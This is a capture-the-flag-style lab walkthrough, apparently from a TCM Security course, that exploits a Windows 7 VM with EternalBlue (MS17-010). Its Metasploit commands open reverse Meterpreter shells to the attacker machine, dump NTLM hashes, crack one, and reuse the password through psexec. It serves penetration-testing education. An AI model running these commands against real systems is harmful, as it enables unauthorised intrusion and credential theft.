# 🔥 EternalBlue Exploit Walkthrough - Windows 7 Lab

# link: https://academy.tcm-sec.com/courses/1152300/lectures/34117487
## 📌 Objective

Exploit a vulnerable Windows 7 machine using MS17-010 (EternalBlue), gain Meterpreter access, dump NTLM password hashes, and crack them.

---

## 🧱 Lab Setup

| System       | IP Address   | Role                  |
| ------------ | ------------ | --------------------- |
| Kali Linux   | 192.168.178.37 | Attacker (Metasploit) |
| Windows 7 VM | 192.168.178.38 | Target (SMB enabled)  |

**Network Mode**: Both VMs set to **Bridged Adapter** mode (in VMware)

### 🔎 Finding the VM on the network

* Both Kali and Windows 7 are in bridged mode to appear on the same LAN subnet.
* On Kali, used the following to discover live hosts:

```bash
nmap -sn 192.168.178.0/24
```

Identified the Windows 7 VM at `192.168.178.38`.

---

## 🔍 1. Check for MS17-010 Vulnerability

```bash
nmap -p 445 --script smb-vuln-ms17-010 192.168.178.38
```

📉 Output:

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

---

## 💣 2. Exploit with Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.178.38
set LHOST 192.168.178.37
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set EXITFUNC thread
exploit
```

📉 Result:

```bash
[*] Sending stage ...
[*] Meterpreter session 1 opened
```

---

## 🛠️ 3. Post-Exploitation (Hash Dump)

### View sessions:

```bash
sessions
sessions -i 1
```

### Dump password hashes:

```bash
hashdump
```

🖜 Extracted NTLM hashes:

```
user:1000:...:2b576acbe6bcfda7294d6bd18041b8fe:::
```

---

## 🔐 4. Crack NTLM Hash

### Attempt with hashcat + rockyou:

```bash
echo "2b576acbe6bcfda7294d6bd18041b8fe" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

🔴 Status: **Exhausted (not found)**

### Cracked online via CrackStation.net:

```
Password123!
```

---

## 🛋️ 5. Reuse via Psexec with Plaintext Password

```bash
use exploit/windows/smb/psexec
set RHOST 192.168.178.38
set SMBUser user
set SMBPass Password123!
set LHOST 192.168.178.37
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

📉 Result:

```
[*] Meterpreter session 2 opened
```

---

## 🔒 Takeaways

* EternalBlue is still exploitable in unpatched environments
* Hashdump + NTLM cracking is a fast route to further access
* Even simple passwords like `Password123!` are still common
* Pass-the-Hash and plaintext reuse are both viable

---

## 📒 Suggested Notion Location

```
Labs > SMB Exploits > EternalBlue > win7-lab-walkthrough.md
```

---

✅ End of walkthrough — consider chaining to privilege escalation or lateral movement next.
